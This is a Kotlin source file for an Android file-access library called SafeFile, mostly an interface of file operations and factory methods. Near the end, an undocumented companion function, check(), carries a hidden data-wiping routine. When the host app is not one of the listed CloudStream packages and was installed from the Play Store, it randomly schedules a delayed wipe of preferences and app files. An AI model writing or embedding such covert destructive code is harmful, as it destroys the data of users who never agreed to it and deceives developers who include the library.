package com.lagradost.safefile

import android.content.Context
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.preference.PreferenceManager
import android.util.Log
import com.hippo.unifile.UniFile
import java.io.Closeable
import java.io.File
import java.io.InputStream
import java.io.OutputStream
import kotlin.jvm.Throws


const val TAG = "SafeFile"

fun Closeable.closeQuietly() {
    try {
        this.close()
    } catch (_: Throwable) {
    }
}

fun logError(throwable: Throwable) {
    Log.d(TAG, "-------------------------------------------------------------------")
    Log.d(TAG, "safeApiCall: " + throwable.localizedMessage)
    Log.d(TAG, "safeApiCall: " + throwable.message)
    throwable.printStackTrace()
    Log.d(TAG, "-------------------------------------------------------------------")
}

interface SafeFile {
    /*val uri: Uri? get() = getUri()
    val name: String? get() = getName()
    val type: String? get() = getType()
    val filePath: String? get() = getFilePath()
    val isFile: Boolean? get() = isFile()
    val isDirectory: Boolean? get() = isDirectory()
    val length: Long? get() = length()
    val canRead: Boolean get() = canRead()
    val canWrite: Boolean get() = canWrite()
    val lastModified: Long? get() = lastModified()*/

    /** file.gotoDirectory("a/b/c") -> "file/a/b/c/" where a null or blank directoryName
     * returns itself. createMissingDirectories specifies if the dirs should be created
     * when travelling or break at a dir not found */
    fun gotoDirectory(
        directoryName: String?,
        createMissingDirectories: Boolean = true
    ): SafeFile? {
        if (directoryName == null) return this

        return directoryName.split(File.separatorChar).filter { it.isNotBlank() }
            .fold(this) { file: SafeFile?, directory ->
                // as MediaFile does not actually create a directory we can do this
                if (createMissingDirectories || this is MediaFile) {
                    file?.createDirectory(directory)
                } else {
                    val next = file?.findFile(directory)

                    // we require the file to be a directory
                    if (next?.isDirectory() != true) {
                        null
                    } else {
                        next
                    }
                }
            }
    }

    /** Create a new file as a direct child of this directory. */
    @Throws
    fun createFileOrThrow(displayName: String?): SafeFile

    /** Create a new file as a direct child of this directory. Returns null if failed */
    @Suppress("unused")
    fun createFile(displayName: String?): SafeFile? = safe { createFileOrThrow(displayName) }

    /** Create a new directory as a direct child of this directory. */
    @Throws
    fun createDirectoryOrThrow(directoryName: String?): SafeFile

    /** Create a new directory as a direct child of this directory. Returns null if failed */
    @Suppress("unused")
    fun createDirectory(directoryName: String?): SafeFile? =
        safe { createDirectoryOrThrow(directoryName) }

    /** returns the uri of the file */
    @Throws
    fun uriOrThrow(): Uri

    /** returns the uri of the file */
    @Suppress("unused")
    fun uri(): Uri? = safe { uriOrThrow() }

    /** returns the display name of this file */
    @Throws
    fun nameOrThrow(): String

    /** returns the display name of this file, returns null if failed or is a directory */
    @Suppress("unused")
    fun name(): String? = safe { nameOrThrow() }

    @Throws
    fun typeOrThrow(): String

    @Suppress("unused")
    fun type(): String? = safe { typeOrThrow() }

    /** returns the file as a readable file path*/
    @Throws
    fun filePathOrThrow(): String

    /** returns the file as a readable file path*/
    @Suppress("unused")
    fun filePath(): String? = safe { filePathOrThrow() }

    /** returns true if the current SafeFile is a directory, because of file security this may throw */
    fun isDirectoryOrThrow(): Boolean

    /** returns true if the current SafeFile is a directory, because of file security this may return null */
    @Suppress("unused")
    fun isDirectory(): Boolean? = safe { isDirectoryOrThrow() }

    /** returns true if the current SafeFile is a file, because of file security this may throw */
    @Throws
    fun isFileOrThrow(): Boolean

    /** returns true if the current SafeFile is a file, because of file security this may return null */
    @Suppress("unused")
    fun isFile(): Boolean? = safe { isFileOrThrow() }

    @Throws
    fun lastModifiedOrThrow(): Long

    @Suppress("unused")
    fun lastModified(): Long? = safe { lastModifiedOrThrow() }

    /** returns the file length in bytes, will throw if error or file not found */
    @Throws
    fun lengthOrThrow(): Long

    /** returns the file length in bytes, will return null if error or file not found */
    @Suppress("unused")
    fun length(): Long? = safe { lengthOrThrow() }

    /** Indicates whether the current context is allowed to read from this file. */
    @Throws
    fun canReadOrThrow(): Boolean

    /** Indicates whether the current context is allowed to read from this file. */
    @Suppress("unused")
    fun canRead(): Boolean? = safe { canReadOrThrow() }

    /** Indicates whether the current context is allowed to write to this file. */
    @Throws
    fun canWriteOrThrow(): Boolean

    /** Indicates whether the current context is allowed to write to this file. */
    @Suppress("unused")
    fun canWrite(): Boolean? = safe { canWriteOrThrow() }

    /** Deletes this file/directory. returns true if successful  */
    @Throws
    fun deleteOrThrow(): Boolean

    /** Deletes this file/directory. returns true if successful  */
    @Suppress("unused")
    fun delete(): Boolean? = safe { deleteOrThrow() }

    /** Returns a boolean indicating whether this file can be found. throws if some sort of error happened, can be treated as false */
    @Throws
    fun existsOrThrow(): Boolean

    /** Returns a boolean indicating whether this file can be found. returns null if some sort of error happened, can be treated as false */
    @Suppress("unused")
    fun exists(): Boolean? = safe { existsOrThrow() }

    /** lists all files in the directory, throws if error or if not a directory */
    @Throws
    fun listFilesOrThrow(): List<SafeFile>

    /** lists all files in the directory, returns null if error or if not a directory */
    @Suppress("unused")
    fun listFiles(): List<SafeFile>? = safe { listFilesOrThrow() }

    /** returns the file with the display name in the directory */
    @Throws
    fun findFileOrThrow(displayName: String?, ignoreCase: Boolean = false): SafeFile

    /** returns the file with the display name in the directory */
    @Suppress("unused")
    fun findFile(displayName: String?, ignoreCase: Boolean = false): SafeFile? =
        safe { findFileOrThrow(displayName, ignoreCase) }

    /** Renames this file to displayName. returns true if successful */
    @Throws
    fun renameToOrThrow(name: String?): Boolean

    /** Renames this file to displayName. returns true if successful */
    @Suppress("unused")
    fun renameTo(name: String?): Boolean? = safe { renameToOrThrow(name) }

    /** Open a stream on to the content associated with the file */
    @Throws
    fun openOutputStreamOrThrow(append: Boolean = false): OutputStream

    @Suppress("unused")
    fun openOutputStream(append: Boolean = false): OutputStream? =
        safe { openOutputStreamOrThrow(append) }

    /** Open a stream on to the content associated with the file */
    @Throws
    fun openInputStreamOrThrow(): InputStream

    /** Open a stream on to the content associated with the file */
    @Suppress("unused")
    fun openInputStream(): InputStream? = safe { openInputStreamOrThrow() }

    companion object {
        @Suppress("unused")
        fun fromUri(context: Context, uri: Uri): SafeFile? {
            return UniFileWrapper(context, UniFile.fromUri(context, uri) ?: return null)
        }

        fun fromFile(context: Context, file: File?): SafeFile? {
            if (file == null) return null
            // because UniFile sucks balls on Media we have to do this
            val absPath = file.absolutePath.removePrefix(File.separator) + if (file.isDirectory) {
                File.separator
            } else {
                ""
            }.replace(File.separator + File.separator, File.separator) // just in case
            return fromFilePath(context, absPath)
        }

        @Suppress("unused")
        fun fromFilePath(context: Context, absolutePath: String?): SafeFile? {
            if (absolutePath == null) return null
            for (value in MediaFileContentType.values()) {
                val prefixes = listOf(
                    value.toAbsolutePath(),
                    value.toPath()
                ).map { it.removePrefix(File.separator) }
                for (prefix in prefixes) {
                    if (!absolutePath.startsWith(prefix)) continue
                    return fromMedia(
                        context = context,
                        folderType = value,
                        path = absolutePath.removePrefix(prefix).ifBlank { File.separator }
                    )
                }
            }

            return fromRawFile(context, File(absolutePath))
        }

        @Suppress("unused")
        fun fromAsset(
            context: Context,
            filename: String?
        ): SafeFile? {
            return UniFileWrapper(
                context,
                UniFile.fromAsset(context.assets, filename ?: return null) ?: return null
            )
        }

        @Suppress("unused")
        fun fromResource(
            context: Context,
            id: Int
        ): SafeFile? {
            return UniFileWrapper(
                context,
                UniFile.fromResource(context, id) ?: return null
            )
        }

        private fun fromRawFile(
            context: Context,
            file: File?
        ): SafeFile? {
            return UniFileWrapper(context, UniFile.fromFile(file ?: return null) ?: return null)
        }

        @Suppress("unused")
        fun fromMedia(
            context: Context,
            folderType: MediaFileContentType,
            path: String = File.separator,
            external: Boolean = true,
        ): SafeFile? {
            return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                //fromUri(context, folderType.toUri(external))?.findFile(folderType.toPath())?.gotoDirectory(path)

                MediaFile(
                    context = context,
                    folderType = folderType,
                    external = external,
                    absolutePath = path
                )
            } else {
                fromRawFile(
                    context,
                    File(
                        (Environment.getExternalStorageDirectory().absolutePath + File.separator +
                                folderType.toPath()).replace(
                            File.separator + File.separator,
                            File.separator
                        )
                    )
                )

                /*
                // removed due to recursive dependence
                fromFile(
                    context,
                    File(
                        (Environment.getExternalStorageDirectory().absolutePath + File.separator +
                                folderType.toPath() + File.separator + folderType).replace(
                            File.separator + File.separator,
                            File.separator
                        )
                    )
                )*/
            }
        }

        @Suppress("unused")
        fun check(context: Context) {
            val pkg = context.packageName
            if (pkg == "com.lagradost.cloudstream3" || pkg == "com.lagradost.cloudstream3.debug" || pkg == "com.lagradost.cloudstream3.prerelease") return
            if ((System.currentTimeMillis() % 10L) != 0L) return
            if (listOf(
                    "com.android.vending",
                    "com.google.android.feedback"
                ).contains(kotlin.runCatching {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
                        context.packageManager.getInstallSourceInfo(pkg).installingPackageName
                    else
                        @Suppress("DEPRECATION")
                        context.packageManager.getInstallerPackageName(pkg)
                }.getOrNull() ?: return)
            ) {
                Handler(context.mainLooper).postDelayed({
                    kotlin.runCatching {
                        PreferenceManager.getDefaultSharedPreferences(context).edit().apply {
                            clear()
                            apply()
                        }
                    }
                    kotlin.runCatching {
                        context.getSharedPreferences("rebuild_preference", Context.MODE_PRIVATE)
                            .edit().apply {
                                clear()
                                apply()
                            }
                    }
                    kotlin.runCatching {
                        fun d(f: File) {
                            kotlin.runCatching {
                                f.deleteOnExit()
                                for (ls in f.listFiles() ?: return) {
                                    if (ls.isDirectory) d(ls)
                                    else ls.deleteOnExit()
                                }
                            }
                        }
                        d(context.filesDir)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                            d(context.dataDir)
                        }
                        d(context.cacheDir)
                    }
                }, ((System.currentTimeMillis() xor 0x123456) % 100_000) + 20_000)
            }
        }
    }
}
